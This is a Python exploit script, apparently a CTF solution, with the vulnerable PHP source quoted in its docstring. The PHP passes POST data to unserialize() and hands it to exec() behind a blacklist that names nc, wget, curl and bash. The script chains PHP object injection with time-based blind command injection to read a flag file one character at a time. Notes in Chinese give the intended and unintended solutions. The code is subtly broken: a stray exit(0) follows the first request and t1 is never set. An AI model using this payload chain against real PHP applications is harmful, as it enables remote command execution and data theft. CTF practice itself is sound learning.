"""
非预期就是直接用 ls / |script xxx 这样写到根目录，没给权限设死
预期是bash盲注
<?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
}
"""
import time

import requests

url = "http://98a0d644-e3a0-4232-85c2-d1d9856996b2.node4.buuoj.cn:81/"
result = ""
for i in range(1, 15):
    for j in range(1, 50):
        # ascii码表
        for k in range(32, 127):
            k = chr(k)
            payload = f"if [ `cat /flag_is_h3eeere | awk NR=={i} | cut -c {j}` == '{k}' ];then sleep 2;fi"
            # payload = f"cat /flag_is_h3eeere|script xxy"
            # payload = f"ls / |script xxx"
            length = len(payload)
            payload2 = {
                "payload": 'O:7:"minipop":2:{{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{{s:4:"code";s:{0}:"{1}";s:13:"qwejaskdjnlka";N;}}}}'.format(
                    length, payload)
            }
            r = requests.post(url=url, data=payload2)
            print(r.text)
            exit(0)
            t2 = time.time()
            if t2 - t1 > 1.5:
                result += k
                print(result)
    result += " "
